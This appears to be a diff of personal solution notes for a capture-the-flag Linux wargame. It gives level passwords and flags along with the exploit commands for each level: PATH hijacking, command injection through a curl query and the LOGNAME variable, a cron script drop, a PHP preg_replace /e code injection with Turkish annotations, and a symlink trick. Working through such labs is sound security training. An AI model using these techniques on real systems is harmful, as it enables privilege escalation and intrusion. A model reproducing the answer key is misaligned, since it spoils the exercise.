@@ -1,16 +1,51 @@
+level00 = password flag00 = nottoohardhere
+level01 = x24ti5gi3x0ol2eh4esiuxias
+	john --format=crypt ~/Documents/flag.txt --wordlist=rockyou.txt
+	password flag01 = abcdefg
 level02 = f2av5il02puano7naaf6adaaf
+	sftp or scp 
+	(secure copy protocol) 
+	scp -P 4242 level02@192.168.56.101:/home/user/level02/level02.pcap .
+	password flag02 =  ft_waNDReL0L
 level03 = kooda2puivaav1idi4f57q8iq
+	scp -P 4242 level03@192.168.56.101:/home/user/level03/level03 .
+	open level03 on binary.ninja 
 	vim /tmp/echo
 		/bin/getflag
 	chmod +x /tmp/echo
 	PATH=/tmp:$PATH ./level03
-level04 = qi0maab88jeaj46qoumi7maus
+level04 = qi0maab88jeaj46qoumi7maus	
 	curl 'localhost:4747?x=$(getflag)'
-level05 = ne2searoevaevoem4ov4ar8ap
-	echo "getflag > /tmp/flagg" > /opt/openarenaserver/script.sh
-level06 = viuaaale9huek52boumoomioc
+level05 = ne2searoevaevoem4ov4ar8ap 
+	cat /usr/sbin/openarenaserver 
+	#!/bin/sh
 
-level08 = fiumuikeil55xe9cu4dood66h	
+	for i in /opt/openarenaserver/* ; do
+		(ulimit -t 5; bash -x "$i")
+		rm -f "$i"
+	done
+	
+	there is a crontab that execute the openarenaserver 
+	ls -l /opt/openarenaserver
+	echo "getflag > /tmp/flag05" > /opt/openarenaserver/script.sh
+	ls -l /opt/openarenaserver
+	script.sh
+	../wait
+	cat /tmp/flag05
+level06 = viuaaale9huek52boumoomioc
+	// $a = file_get_contents($y);
+	- $y dosyasını açar ve içeriğini $a değişkenine alır.
+	// $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+	- preg_replace(.../e...) ifadesi PHP 5.5'ten itibaren kaldırılmıştır
+	- /e modifikatörü sayesinde PHP kodu eval() gibi çalıştırılır.
+	- [x a.b@c] → önce y("a.b@c") → "a x b y c"
+	- Kalan tüm [ karakterlerini ( yapar.
+	- Kalan tüm ] karakterlerini ) yapar.
+	*** 
+	echo '[x ${`getflag`}]' > /tmp/test	
+level07 = wiok45aaoguiboiki2tuin6ub
+	export LOGNAME='$(/bin/getflag)'
+level08 = fiumuikeil55xe9cu4dood66h
 	ln -s /home/user/level08/token /tmp/cpy
 	./level08 /tmp/cpy
 	su flag08
